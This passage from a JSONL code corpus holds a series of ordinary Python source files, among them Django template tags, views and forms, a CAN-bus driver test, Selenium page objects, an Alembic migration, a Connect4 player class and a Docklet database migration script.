\"finished\"]\n"}
{"text": "# -*- coding: utf-8 -*-\nfrom django import template\nfrom django.db.models.query import QuerySet\nimport datetime\nfrom django import template\nfrom django.contrib.auth.models import Group\nfrom django.contrib.auth.models import User\nfrom django.db.models import Q\n\nregister = template.Library()\n@register.inclusion_tag('sidebar_tree.html')\ndef children_tag(person):\n    if isinstance(person, QuerySet):\n        children = person\n    else:\n        children = person.children.all()\n    #zip(children,map(children.content_type,children)\n    return {'children': children}\n\n@register.filter(name='has_group')\ndef has_group(user, group_name):\n    return user.groups.filter(name=group_name).exists()\n\n@register.filter(name='get_staff')\ndef get_staff(group_name):\n    group = Group.objects.get(name=group_name)\n    users = group.user_set.all()\n    return map(lambda x:x.id , users)\n\n\n@register.filter(name='get_nameFromId')\ndef get_nameFromId(usrId):\n    if usrId:\n        user = User.objects.get(id=usrId)\n        return user.first_name+user.last_name\n    else:\n        return \"\"\n    \n@register.filter\ndef get_range( value ):\n  \"\"\"\n    Filter - returns a list containing range made from given value\n    Usage (in template):\n\n    <ul>{% for i in 3|get_range %}\n      <li>{{ i }}. Do something</li>\n    {% endfor %}</ul>\n\n    Results with the HTML:\n    <ul>\n      <li>0. Do something</li>\n      <li>1. Do something</li>\n      <li>2. Do something</li>\n    </ul>\n\n    Instead of 3 one may use the variable set in the views\n  \"\"\"\n  return range( value )\n  \n@register.filter\ndef get_fields(model):\n    return model._meta.get_fields()"}
{"text": "# -*- coding: utf-8 -*-\n# Copyright (c) 2013 The pycan developers. All rights reserved.\n# Project site: https://github.com/questrail/pycan\n# Use of this source code is governed by a MIT-style license that\n# can be found in the LICENSE.txt file for the project.\nimport os\nimport time\nimport threading\nimport unittest\nimport ConfigParser\nimport pycan.drivers.kvaser as driver\nfrom pycan.common import CANMessage\n\n\nclass KvaserTests(unittest.TestCase):\n    def tearDown(self):\n        try:\n            self.driver.bus_off()\n            self.driver.shutdown()\n            time.sleep(2)\n        except:\n            pass\n\n    def __load_test_config(self):\n        test_path = os.path.dirname(os.path.abspath(__file__))\n        config = ConfigParser.ConfigParser()\n        config.read(os.path.join(test_path, 'test.cfg'))\n\n        self.known_can_id = int(config.get('COMMON', 'Known_ID_On_Bus'), 16)\n\n    def testPEP8Compliance(self):\n        # Ensure PEP8 is installed\n        try:\n            import pep8\n        except ImportError:\n            self.fail(msg=\"PEP8 not installed.\")\n\n        # Check the CAN driver\n        driver_path = os.path.dirname(driver.__file__)\n        driver_file = os.path.abspath(os.path.join(driver_path, 'kvaser.py'))\n        pep8_checker = pep8.Checker(driver_file)\n        violation_count = pep8_checker.check_all()\n        error_message = \"PEP8 violations found: %d\" % (violation_count)\n        self.assertTrue(violation_count == 0, msg = error_message)\n\n    def testDriver(self):\n        # Load the real time test configuration\n        self.__load_test_config()\n\n        # Setup the driver\n        self.driver = driver.Kvaser()\n\n        # Run the driver specific tests if and only if the driver was setup\n        self.Transmit()\n        self.Receive()\n        self.SpecificReceive()\n\n    def Transmit(self):\n        # Note you must also check that the CAN message is being placed\n        # on the wire at 100ms intervals\n        messages_to_send = 50\n\n        msg1 = CANMessage(0x123456, [1,2,3])\n        for x in range(messages_to_send):\n            time.sleep(0.1)\n            msg = \"Failed to send message {x}\".format(x=x)\n            self.assertTrue(self.driver.send(msg1), msg)\n\n        self.assertEqual(self.driver.life_time_sent(), messages_to_send)\n\n    def Receive(self):\n        messages_to_receive = 25\n\n        # Check that the life time received hasn't been updated yet\n        self.assertEqual(self.driver.life_time_received(), 0)\n\n        # Read back a fixed number of messages and check that the lifetime\n        # values track the next_message call\n        read_messages = 0\n        for x in range(messages_to_receive):\n            if self.driver.next_message():\n                self.assertEqual((x+1), self.driver.life_time_received())\n\n    def SpecificReceive(self):\n        messages_to_receive = 10\n        actual_messaged_received = 0\n        max_specific_attempts = 1000\n\n        # Keep reading from the bus until we find the required messages\n        read_messages = 0\n        for x in range(max_specific_attempts):\n            msg = self.driver.next_message()\n            if msg.id == self.known_can_id:\n                actual_messaged_received += 1\n\n                if actual_messaged_received == messages_to_receive:\n                    break;\n\n        self.assertEqual(actual_messaged_received, messages_to_receive)\n"}
{"text": "# Django\nfrom pom.pages.basePage import BasePage\n\n# local Django\nfrom pom.locators.jobSearchPageLocators import JobSearchPageLocators\nfrom pom.pages.authenticationPage import AuthenticationPage\nfrom pom.pageUrls import PageUrls\n\n\nclass JobSearchPage(BasePage):\n\n    job_search_page = PageUrls.job_list_page\n\n    def __init__(self, driver):\n        self.driver = driver\n        self.authentication_page = AuthenticationPage(self.driver)\n        self.elements = JobSearchPageLocators()\n        super(JobSearchPage, self).__init__(driver)\n\n    def navigate_to_job_search_page(self):\n        self.get_page(self.live_server_url, self.job_search_page)\n\n    def submit_form(self):\n        self.element_by_id(self.elements.SUBMIT_PATH).click()\n\n    def send_to_field(self, field, value):\n        text_box = self.find_element_by_css_selector(field)\n        text_box.clear()\n        text_box.send_keys(value)\n\n    def search_name_field(self, search_text):\n        self.send_to_field(self.elements.NAME_FIELD, search_text)\n\n    def search_start_date_field(self, search_text):\n        self.send_to_field(self.elements.START_DATE_FIELD, search_text)\n\n    def search_end_date_field(self, search_text):\n        self.send_to_field(self.elements.END_DATE_FIELD, search_text)\n\n    def search_city_field(self, search_text):\n        self.send_to_field(self.elements.CITY_FIELD, search_text)\n\n    def search_state_field(self, search_text):\n        self.send_to_field(self.elements.STATE_FIELD, search_text)\n\n    def search_country_field(self, search_text):\n        self.send_to_field(self.elements.COUNTRY_FIELD, search_text)\n\n    def search_event_field(self, search_text):\n        self.send_to_field(self.elements.EVENT_FIELD, search_text)\n\n    def get_help_block(self):\n        return self.element_by_class_name(self.elements.HELP_BLOCK)\n\n    def get_search_results(self):\n        search_results = self.element_by_xpath(self.elements.RESULT_BODY)\n        return search_results\n\n"}
{"text": "#!/bin/env python\n#\n# AutoPyfactory batch plugin for Condor\n#\n\nfrom CondorCEBatchSubmitPlugin import CondorCEBatchSubmitPlugin \nfrom autopyfactory import jsd \n\n\nclass CondorGRAMBatchSubmitPlugin(CondorCEBatchSubmitPlugin):\n   \n    def __init__(self, apfqueue, config=None):\n        if not config:\n            qcl = apfqueue.factory.qcl            \n        else:\n            qcl = config\n        newqcl = qcl.clone().filterkeys('batchsubmit.condorgram', 'batchsubmit.condorce')    \n        super(CondorGRAMBatchSubmitPlugin, self).__init__(apfqueue, config=newqcl) \n        \n        try:\n            self.globus = self._globusrsl(apfqueue, qcl) \n        except Exception, e:\n            self.log.error(\"Caught exception: %s \" % str(e))\n            raise\n\n        self.log.info('CondorGRAMBatchSubmitPlugin: Object initialized.')\n  \n    def _globusrsl(self, apfqueue, qcl):\n        '''\n        tries to build globusrsl line.\n        Entries have been renamed by the subplugins (e.g. CondorGT2), with new patterns:\n            -- batchsubmit.condorgram.gram.XYZ\n            -- batchsubmit.condorgram.gram.globusrsl\n            -- batchsubmit.condorgram.gram.globusrsladd\n        '''\n        self.log.debug('Starting.')  # with new architecture there is no logger yet   \n        globus = \"\" \n        optlist = []\n        for opt in qcl.options(self.apfqname):\n            if opt.startswith('batchsubmit.condorgram.gram.') and\\\n                opt != 'batchsubmit.condorgram.gram.globusrsl' and\\\n                opt != 'batchsubmit.condorgram.gram.globusrsladd':\n                    optlist.append(opt)\n        \n        globusrsl = qcl.generic_get(self.apfqname, 'batchsubmit.condorgram.gram.globusrsl')\n        globusrsladd = qcl.generic_get(self.apfqname, 'batchsubmit.condorgram.gram.globusrsladd')\n\n        if globusrsl:\n            globus = globusrsl\n        else:\n                for opt in optlist:\n                    key = opt.split('batchsubmit.condorgram.gram.')[1]\n                    value = qcl.generic_get(self.apfqname, opt)\n                    if value != \"\":\n                            globus += '(%s=%s)' %(key, value)\n        \n        if globusrsladd:\n            globus += globusrsladd\n        \n        self.log.debug('Leaving with value = %s.' %globus)  # with new architecture there is no logger yet\n        return globus\n         \n    def _addJSD(self):\n        '''\n        add things to the JSD object \n        '''\n    \n        self.log.debug('CondorGRAMBatchSubmitPlugin.addJSD: Starting.')\n   \n        # -- globusrsl -- \n        if self.globus:\n            self.JSD.add('globusrsl', '%s' %self.globus)\n        ###globusrsl = \"globusrsl=(jobtype=%s)\" %self.jobtype\n        ###if self.queue:\n        ###     globusrsl += \"(queue=%s)\" % self.queue\n        ###self.JSD.add(globusrsl)\n\n        # -- fixed stuffs --\n        self.JSD.add('copy_to_spool', 'True')\n\n        super(CondorGRAMBatchSubmitPlugin, self)._addJSD() \n    \n        self.log.debug('CondorGRAMBatchSubmitPlugin.addJSD: Leaving.')\n    \n"}
{"text": "# -*- coding: utf-8 -*-\nfrom model.channel import Channel\n\n\nclass DbChannelHelper:\n\n    def __init__(self, db):\n        self.db = db\n\n    def get_channels(self):\n        channels = []\n        cursor = self.db.connection.cursor()\n        try:\n            cursor.execute(\n                \"select id, name, service_id, epg_name, epg_channel.offset, provider, icon, allow_record, narrow_banner, wide_banner from epg_channel\")\n            for row in cursor:\n                (id, name, service_id, epg_name, offset, provider, icon, allow_record, narrow_banner, wide_banner) = row\n                channels.append(\n                    Channel(id=str(id), name=name, service_id=str(service_id), epg_name=epg_name, offset=str(offset),\n                            provider=provider, languages=self.get_channel_languages(id), allow_record=bool(allow_record),\n                            icon={\"server_file\": icon, \"user_file\": None}, narrow_banner={\"server_file\": narrow_banner, \"user_file\": None},\n                            wide_banner={\"server_file\": wide_banner, \"user_file\": None}))\n                            # provider=provider, languages=self.get_channel_languages(id), allow_record=bool(allow_record),\n                            # icon={\"server_file\": self.full_path_if_exists(icon), \"user_file\": None}, narrow_banner=self.full_path_if_exists(narrow_banner),\n                            # wide_banner=self.full_path_if_exists(wide_banner)))\n            self.db.connection.commit()\n        finally:\n            cursor.close()\n            # self.connection.close()\n        # print channels\n        return channels\n\n\n    def get_channel_languages(self, channel_id):\n        languages = []\n        cursor = self.db.connection.cursor()\n        try:\n            cursor.execute(\n                \"select language_id from epg_channel_languages where channel_id=\" + str(channel_id))\n            for row in cursor:\n                languages.append(str(row[0]))\n            self.db.connection.commit()\n        finally:\n            cursor.close()\n        return languages\n\n    def count(self):\n        cursor = self.db.connection.cursor()\n        try:\n            cursor.execute(\"select count(*) from epg_channel\")\n            count = cursor.fetchone()[0]\n            self.db.connection.commit()\n        finally:\n            cursor.close()\n            # self.connection.close()\n        # print count, type(count), int(count), type(count)\n        return int(count)\n\n    # def full_path_if_exists(self, relative_path):\n    #     # base_media_url = nose_config.load_config()['web']['baseUrl'] + \"media/\"\n    #     global base_media_url\n    #     if relative_path:\n    #         return base_media_url + relative_path"}
{"text": "import random\n\ndef sequentialy(qset):\n    rset = []\n    for i in range(0, len(qset)):\n\trset.append(qset[i])\n    \n    return rset\n\n\ndef randomly(_qset):\n    qset = list(_qset)\n    rset = []\n    while qset:\n        sel = random.choice(qset)\n\trset.append(sel)\n\tqset.remove(sel)\n\n    return rset\n\ndef fullBFS(qset):\n    if len(qset) <= 2:\n        return qset\n\n    rset = []\n    rset.append(qset[0])\n    rset.append(qset[-1])\n    end = len(qset) - 2\n\n    queue = []\n    cur = Node((1 + end + 1) / 2, 1 ,end)\n    queue.append(cur)\n\n    while len(queue) != 0 :\n        cur = queue.pop(0)\n        rset.append(qset[cur.val])\n\n        if cur.left < cur.val:\n            val = (cur.left + cur.val) / 2\n            leftSon = Node(val, cur.left, cur.val - 1)\n            queue.append(leftSon)\n\n        if cur.val < cur.right:\n            val = (cur.right + cur.val +1) / 2\n            rightSon = Node(val, cur.val+1, cur.right)\n            queue.append(rightSon)\n\n    return rset\n\n\n##################### below is abandoned #######################\n\ndef binary(qset, num):\n    if num > len(qset) or num <= 0:\n\tprint \"subquery amount overflow! num = \" + str(num)\n\treturn qset\n\n    rset = []\n    rset.append(qset[0])\n    if num == 1:\n\treturn rset\n\t\n    end = len(qset) - 1\n    rset.append(qset[end])\n    count = []\n    count.append(num - 2) # minus 2: head and tail element\n    bs_helper(qset, rset, 1, end-1, count)\n    return rset\n    \ndef bs_helper(qset, rset, left, right, count):\n    if left > right or count[0] <= 0:\n\treturn\n    mid = (left + right)/2\n#    print qset[mid]\n    rset.append(qset[mid])\n    count[0] -= 1\n    bs_helper(qset, rset, left, mid - 1, count)\n    bs_helper(qset, rset, mid + 1, right, count)\n\ndef skip(qset, num):\n    if num > len(qset) or num <= 0:\n\tprint \"subquery amount overflow! num = \" + str(num)\n\treturn qset\n    \n    visited = [False] * len(qset)\n    rset = []\n    rset.append(qset[0])\n    visited[0] = True\n    if num == 1:\n\treturn rset\n\n    end = len(qset) - 1\n    rset.append(qset[end])\n    visited[end] = True\n    num -= 2\n    step = len(qset) / 2\n    while num > 0 and step > 0:\n\tcur = 0\n\twhile cur < end:\n\t    if not visited[cur]:\n\t\trset.append(qset[cur])\n\t\tvisited[cur] = True\n\t    cur += step\n\t\n\tstep /= 2\n\n    return rset\n\nclass Node(object):\n    def __init__(self, val, left, right):\n\tself.val = val\n\tself.left = left\n\tself.right = right\n\n\ndef BTLT(qset, num):\n    if num >= len(qset) or num <= 0:\n#\tprint \"subquery amount overflow! num = \" + str(num)\n\treturn qset\n \n    rset = []\n    rset.append(qset[0])\n    if num == 1:\n\treturn rset\n\t\n    end = len(qset) - 1\n    rset.append(qset[end])\n    if num == 2:\n\treturn rset\n\n    visited = [False] * len(qset)\n    visited[0] = True\n    visited[1] = True\n    num -= 2\n    queue = []\n    cur = Node(len(qset) / 2, 0 ,end)\n    queue.append(cur)\n    while len(queue) != 0 and num > 0:\n\tcur = queue.pop(0)\n\tif not visited[cur.val]:\n            rset.append(qset[cur.val])\n\t    visited[cur.val] = True\n\t    num -= 1\n\n\tleftVal = (cur.left + cur.val) / 2 \n\tleftSon = Node(leftVal, cur.left, cur.val)\n\trightVal = (cur.right + cur.val) / 2\n\trightSon = Node(rightVal, cur.val, cur.right)\n\tqueue.append(leftSon)\n\tqueue.append(rightSon)\n\n    return rset\n\n"}
{"text": "# coding: utf-8\n\n\"\"\"\n    Server API\n\n    Reference for Server API (REST/Json)\n\n    OpenAPI spec version: 1.4.41\n    \n    Generated by: https://github.com/swagger-api/swagger-codegen.git\n\"\"\"\n\n\nfrom __future__ import absolute_import\n\nimport os\nimport sys\nimport unittest\n\nimport kinow_client\nfrom kinow_client.rest import ApiException\nfrom kinow_client.apis.media_sources_api import MediaSourcesApi\n\n\nclass TestMediaSourcesApi(unittest.TestCase):\n    \"\"\" MediaSourcesApi unit test stubs \"\"\"\n\n    def setUp(self):\n        self.api = kinow_client.apis.media_sources_api.MediaSourcesApi()\n\n    def tearDown(self):\n        pass\n\n    def test_get_media_source(self):\n        \"\"\"\n        Test case for get_media_source\n\n        \n        \"\"\"\n        pass\n\n    def test_get_media_source_files(self):\n        \"\"\"\n        Test case for get_media_source_files\n\n        \n        \"\"\"\n        pass\n\n    def test_get_media_sources(self):\n        \"\"\"\n        Test case for get_media_sources\n\n        \n        \"\"\"\n        pass\n\n    def test_post_media_source_files(self):\n        \"\"\"\n        Test case for post_media_source_files\n\n        \n        \"\"\"\n        pass\n\n\nif __name__ == '__main__':\n    unittest.main()\n"}
{"text": "# coding: utf8\nfrom django.conf.urls import url\nfrom django.contrib import admin\nfrom django.contrib.auth.admin import UserAdmin as BaseUserAdmin\nfrom django.contrib.auth.models import User\n\nimport models\n\n\nclass SSUserAdmin(admin.StackedInline):\n    model = models.SSUser\n    fk_name = 'user'\n\n\nclass UserAdmin(BaseUserAdmin):\n    inlines = (SSUserAdmin,)\n\n    # change_list_template = 'ssadmin/extras/change_list.html'\n\n    def get_urls(self):\n        return [\n                   url(r'^provision_vpn$',\n                       self.admin_site.admin_view(self.provision_vpn),\n                       name='provision_vpn'\n                       ),\n\n               ] + super(UserAdmin, self).get_urls()\n\n    def provision_vpn(self, request, queryset):\n        for user in queryset:\n            models.SSUser.provision(user, '111', '1000000000')\n\n    provision_vpn.short_description = u'\u5f00\u901avpn'\n\n    actions = [provision_vpn]\n\n\nadmin.site.unregister(User)\nadmin.site.register(User, UserAdmin)\n\n\n@admin.register(models.FlowUseHistory)\nclass FlowUseHistoryAdmin(admin.ModelAdmin):\n    pass\n"}
{"text": "import os\nimport requests\nimport urania.connection\n\ndef get_devices(users=None):\n    users = users if users is not None else urania.config.all_users()\n    return [urania.connection.get_registered_devices(user) for user in users]\n\ndef download_track(user, track, path):\n    url = urania.connection.get_stream_url(user, track['id'])\n    response = requests.get(url)\n    if not response.ok:\n        raise Exception(\"Failed to get {}: {}\".format(track['id'], response.text))\n    with open(path, 'wb') as f:\n        for block in response.iter_content(1024):\n            if not block:\n                break\n            f.write(block)\n\ndef sync(users):\n    for user in users:\n        tracks = urania.connection.get_all_tracks(user)\n        for track in tracks:\n            path = \"{}/{}.mp3\".format(user.music_home, track['id'])\n            if not os.path.exists(path):\n                download_track(user, track, path)\n\nfrom gmusicapi import Webclient, Mobileclient\nimport gmusicapi.exceptions\nimport getpass\nimport os\nimport pprint\nimport requests\nimport time\n"}
{"text": "from django.conf import settings\nfrom django.contrib import messages\n\nfrom auth.forms.settings.avatar import AvatarForm\nfrom django.contrib.auth import get_user_model\nfrom django.contrib.auth.mixins import LoginRequiredMixin\nfrom django.core.exceptions import PermissionDenied\nfrom django.shortcuts import get_object_or_404, redirect\nfrom django.urls import reverse\nfrom django.utils.translation import ugettext as _\nfrom django.views.generic.base import TemplateView\nfrom PIL import Image\nfrom io import BytesIO\n\nsize = 32, 32\n\n\nclass AvatarView(LoginRequiredMixin, TemplateView):\n    template_name = 'accounts/settings/avatar.html'\n\n    def get_context_data(self, **kwargs):\n        return {\n            'form': self.form,\n            'user': self.user,\n        }\n\n    def dispatch(self, request, pk, *args, **kwargs):\n        self.user = get_object_or_404(get_user_model().objects.all(), pk=pk)\n\n        if not request.user.is_superuser and request.user != self.user:\n            raise PermissionDenied(_('You do not have permission to edit this user.'))\n\n        self.form = AvatarForm(request.POST or None, request.FILES or None)\n        return super(AvatarView, self).dispatch(request, *args, **kwargs)\n\n    def post(self, request, *args, **kwargs):\n        if self.form.is_valid():\n            try:\n                avatar_content = request.FILES['avatar'].read()\n                avatar = Image.open(BytesIO(avatar_content))\n                avatar = avatar.resize(size)\n                avatar_out = BytesIO()\n                avatar.save(avatar_out, format='PNG')\n                avatar_out.seek(0)\n\n                manager = settings.PLATFORM_MANAGER()\n                manager.upload_avatar(avatar_out, self.user)\n\n            except Exception as exception:\n                print(exception)\n            messages.success(request, _('The avatar has been updated.'))\n\n            return redirect(reverse('users:avatar', args=[self.user.pk]))\n        return self.render_to_response(self.get_context_data())\n\n\n"}
{"text": "# -*- coding: utf-8 -*-\n#\n# Copyright (C) 2009  Red Hat, Inc.\n# This file is part of python-fedora\n#\n# python-fedora is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# python-fedora is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with python-fedora; if not, see <http://www.gnu.org/licenses/>\n#\n'''\nFunctions to manipulate urls.\n\n.. versionadded:: 0.3.17\n\n.. moduleauthor:: John (J5) Palmieri <johnp@redhat.com>\n.. moduleauthor:: Toshio Kuratomi <tkuratom@redhat.com>\n'''\n\n\nfrom kitchen.iterutils import isiterable\nfrom six.moves.urllib.parse import parse_qs, urlencode, urlparse, urlunparse\n\n\ndef update_qs(uri, new_params, overwrite=True):\n    '''Helper function for updating query string values.\n\n    Similar to calling update on a dictionary except we modify the query\n    string of the uri instead of another dictionary.\n\n    :arg uri: URI to modify\n    :arg new_params: Dict of new query parameters to add.\n    :kwarg overwrite: If True (default), any old query parameter with the same\n        name as a new query parameter will be overwritten.  If False, the new\n        query parameters will be appended to a list with the old parameters at\n        the start of the list.\n    :returns: URI with the new parameters added.\n    '''\n    loc = list(urlparse(uri))\n    query_dict = parse_qs(loc[4])\n    if overwrite:\n        # Overwrite any existing values with the new values\n        query_dict.update(new_params)\n    else:\n        # Add new values in addition to the existing parameters\n        # For every new entry\n        for key in new_params:\n            # If the entry already is present\n            if key in query_dict:\n                if isiterable(new_params[key]):\n                    # If the new entry is a non-string iterable\n                    try:\n                        # Try to add the new values to the existing entry\n                        query_dict[key].extend(new_params[key])\n                    except AttributeError:\n                        # Existing value wasn't a list, make it one\n                        query_dict[key] = [query_dict[key], new_params[key]]\n                else:\n                    # The new entry is a scalar, so try to append it\n                    try:\n                        query_dict[key].append(new_params[key])\n                    except AttributeError:\n                        # Existing value wasn't a list, make it one\n                        query_dict[key] = [query_dict[key], new_params[key]]\n            else:\n                # No previous entry, just set to the new entry\n                query_dict[key] = new_params[key]\n\n    # seems that we have to sanitize a bit here\n    query_list = []\n    for key, value in query_dict.items():\n        if isiterable(value):\n            for item in value:\n                query_list.append((key, item))\n            continue\n        query_list.append((key, value))\n\n    loc[4] = urlencode(query_list)\n\n    return urlunparse(loc)\n\n__all__ = ['update_qs']\n"}
{"text": "\"\"\"empty message\n\nRevision ID: 10723b632a87\nRevises: 3d7ce850941c\nCreate Date: 2013-11-12 22:18:26.482191\n\n\"\"\"\n\n# revision identifiers, used by Alembic.\nrevision = '10723b632a87'\ndown_revision = '3d7ce850941c'\n\nfrom alembic import op\nimport sqlalchemy as sa\n\n\ndef upgrade():\n    ### commands auto generated by Alembic - please adjust! ###\n    op.create_table('comment',\n    sa.Column('id', sa.Integer(), nullable=False),\n    sa.Column('commenter_id', sa.Integer(), nullable=False),\n    sa.Column('user_id', sa.Integer(), nullable=False),\n    sa.Column('time', sa.DateTime(), nullable=False),\n    sa.Column('comment', sa.Text(), nullable=False),\n    sa.Column('stars', sa.Integer(), nullable=False),\n    sa.ForeignKeyConstraint(['commenter_id'], ['user.id'], ),\n    sa.ForeignKeyConstraint(['user_id'], ['user.id'], ),\n    sa.PrimaryKeyConstraint('id')\n    )\n    ### end Alembic commands ###\n\n\ndef downgrade():\n    ### commands auto generated by Alembic - please adjust! ###\n    op.drop_table('comment')\n    ### end Alembic commands ###\n"}
{"text": "# -*- coding: utf-8 -*-\n\n\nclass EnvManager(object):\n    \"\"\"\n    \u041a\u043e\u043b\u043b\u0435\u043a\u0446\u0438\u044f \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0445 \u043e\u043a\u0440\u0443\u0436\u0435\u043d\u0438\u044f.\n    \"\"\"\n\n    def __init__(self):\n        # \u0432\u043d\u0443\u0442\u0440\u0435\u043d\u043d\u0435 \u043a\u043e\u043b\u043b\u0435\u043a\u0446\u0438\u044f\n        self.vars = dict()\n\n    def expandvars(self, path: str):\n        \"\"\"\n        \u0417\u0430\u043c\u0435\u043d\u044f\u0435\u0442 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0435 \u043e\u043a\u0440\u0443\u0436\u0435\u043d\u0438\u044f \u0432 \u043f\u0443\u0442\u0438 \u043d\u0430 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f.\n\n        \"\"\"\n        result = path\n\n        if result:\n            for (key, value) in self.vars.items():\n                result = result.replace(key, value)\n\n        return result\n\n    def __setitem__(self, key, value):\n        \"\"\"\n        \u0421\u043f\u0435\u0446\u0438\u0430\u043b\u044c\u043d\u044b\u0439 \u043c\u0435\u0442\u043e\u0434 \u0434\u043b\u044f \u0441\u0438\u043d\u0442\u0430\u043a\u0441\u0438\u0441\u0430 envs['key'] = 'value'\n        \"\"\"\n        self.vars.__setitem__(key, value)\n\n    def __getitem__(self, key):\n        \"\"\"\n        \u0421\u043f\u0435\u0446\u0438\u0430\u043b\u044c\u043d\u044b\u0439 \u043c\u0435\u0442\u043e\u0434 \u0434\u043b\u044f \u0441\u0438\u043d\u0442\u0430\u043a\u0441\u0438\u0441\u0430 val = envs['key']\n        \"\"\"\n        return self.vars.__getitem__(key)\n\n    def __delitem__(self, key):\n        \"\"\"\n        \u0421\u043f\u0435\u0446\u0438\u0430\u043b\u044c\u043d\u044b\u0439 \u043c\u0435\u0442\u043e\u0434 \u0434\u043b\u044f \u0441\u0438\u043d\u0442\u0430\u043a\u0441\u0438\u0441\u0430 del envs['key']\n        \"\"\"\n        self.vars.__delitem__(key)"}
{"text": "from django import forms\n\nfrom edc_constants.constants import YES\nfrom ..models import MaternalContact, MaternalLocator\n\n\nclass MaternalContactForm(forms.ModelForm):\n\n    def clean(self):\n        cleaned_data = super(MaternalContactForm, self).clean()\n        self.validate_maternal_locator()\n        self.validate_contact_success()\n        return cleaned_data\n\n    def validate_maternal_locator(self):\n        cleaned_data = self.cleaned_data\n        subject_identifier = cleaned_data.get(\n            'registered_subject').subject_identifier\n        try:\n            locator = MaternalLocator.objects.get(\n                registered_subject__subject_identifier=subject_identifier)\n        except MaternalLocator.DoesNotExist:\n            raise forms.ValidationError(\n                'Please complete the Locator form before adding contact record.')\n        else:\n            if cleaned_data.get('contact_type') == 'voice_call':\n                if locator.may_follow_up != YES:\n                    raise forms.ValidationError(\n                        'Maternal Locator says may_follow_up: {}, you cannot call '\n                        'participant if they did not give permission.'.format(locator.may_follow_up))\n            if cleaned_data.get('contact_type') == 'text_message':\n                if locator.may_sms_follow_up != YES:\n                    raise forms.ValidationError(\n                        'Maternal Locator says may_sms_follow_up: {}, you cannot sms '\n                        'participant if they did not give permission.'.format(locator.may_sms_follow_up))\n\n    def validate_contact_success(self):\n        cleaned_data = self.cleaned_data\n        if cleaned_data.get('contact_success') == YES:\n            if not cleaned_data.get('contact_comment'):\n                raise forms.ValidationError(\n                    'Please give the outcome of the contact with the participant.')\n\n    class Meta:\n        model = MaternalContact\n        fields = '__all__'\n"}
{"text": "from Player import Player\nimport numpy\n\nclass Connect4_Human(Player):\n\n    def __init__(self,value):\n        self.value = value\n    #end def init()\n\n    '''\n    \n    '''\n    def value(self):\n        return self.value\n    #end def value()\n\n    '''\n\n    '''\n    def DetermineMove(self, board):\n        \n        #####\n        # Print the board to the console\n        #####\n        print '-------------------------------------------------'\n        print 'Player %d\\'s turn:' % self.value\n        #board.PrintBoard()\n\n        #####\n        # Wait for the player to make their move\n        #####\n        tryAgain = True\n        while(tryAgain):\n            move = raw_input('Enter a column for your move:')\n            try:\n                col = int(move)\n            except:\n                print('ERROR: Please enter a valid integer')\n                continue\n            #end try\n            tryAgain = not board.IsValidMove(col)\n        #end while\n        print '-------------------------------------------------'\n        return col\n    #end def DetermineMove()\n\n#end class Connect4_Human\n"}
{"text": "import sys\nsys.path.append(\"../src/\")\nimport os,json\nfrom datetime import datetime\nfrom model import db, VCluster, Container, PortMapping, Image, BillingHistory\n\ntimeFormat = \"%Y-%m-%d %H:%M:%S\"\ndockletPath = \"/opt/docklet/global\"\nusersdir = dockletPath + \"/users/\"\n\ntry:\n    VCluster.query.all()\nexcept Exception as err:\n    print(\"Create database...\")\n    db.create_all()\n\nprint(\"Update vcluster...\")\nfor user in os.listdir(usersdir):\n    tmppath = usersdir+user+\"/clusters/\"\n    if not os.path.exists(tmppath):\n        continue\n    print(\"Update User: \"+str(user))\n    clusterfiles = os.listdir(tmppath)\n    for cluname in clusterfiles:\n        cluFile = open(tmppath+cluname,\"r\")\n        cluinfo = json.loads(cluFile.read())\n        vcluster = VCluster(cluinfo['clusterid'],cluname,user,cluinfo['status'],cluinfo['size'],cluinfo['nextcid'],cluinfo['proxy_server_ip'],cluinfo['proxy_public_ip'])\n        vcluster.create_time = datetime.strptime(cluinfo['create_time'],timeFormat)\n        vcluster.start_time = cluinfo['start_time']\n        for coninfo in cluinfo['containers']:\n            lastsavet = datetime.strptime(coninfo['lastsave'],timeFormat)\n            con = Container(coninfo['containername'], coninfo['hostname'], coninfo['ip'], coninfo['host'], coninfo['image'], lastsavet, coninfo['setting'])\n            vcluster.containers.append(con)\n        for pminfo in cluinfo['port_mapping']:\n            pm = PortMapping(pminfo['node_name'], pminfo['node_ip'], int(pminfo['node_port']), int(pminfo['host_port']))\n            vcluster.port_mapping.append(pm)\n        if \"billing_history\" in cluinfo.keys():\n            for nodename in cluinfo['billing_history'].keys():\n                bhinfo = cluinfo['billing_history'][nodename]\n                bh = BillingHistory(nodename,bhinfo['cpu'],bhinfo['mem'],bhinfo['disk'],bhinfo['port'])\n                vcluster.billing_history.append(bh)\n        try:\n            db.session.add(vcluster)\n            db.session.commit()\n        except Exception as err:\n            print(err)\n        cluFile.close()\n\nprint(\"Update Images...\")\nfor shareStr in ['private/','public/']:\n    print(\"Update \"+shareStr+\" Images...\")\n    for user in os.listdir(dockletPath+\"/images/\"+shareStr):\n        print(\"Update User: \"+user)\n        tmppath = dockletPath+\"/images/\"+shareStr+user+\"/\"\n        files = os.listdir(tmppath)\n        images = []\n        for file in files:\n            if file[0] == \".\" or file[-3] != \".\":\n                continue\n            images.append(file[:-3])\n        for img in images:\n            infofile = open(tmppath+\".\"+img+\".info\",\"r\")\n            imginfo = infofile.read().split('\\n')\n            infofile.close()\n            desfile = open(tmppath+\".\"+img+\".description\",\"r\")\n            desinfo = desfile.read()\n            dbimage = Image.query.filter_by(imagename=img,ownername=user).first()\n            if dbimage is None:\n                dbimage = Image(img,False,False,user,desinfo)\n                dbimage.create_time = datetime.strptime(imginfo[0],timeFormat)\n            if shareStr == 'public/':\n                dbimage.hasPublic = True\n            else:\n                dbimage.hasPrivate = True\n            try:\n                db.session.add(dbimage)\n                db.session.commit()\n            except Exception as err:\n                print(err)\nprint(\"Finished!\")\n"}
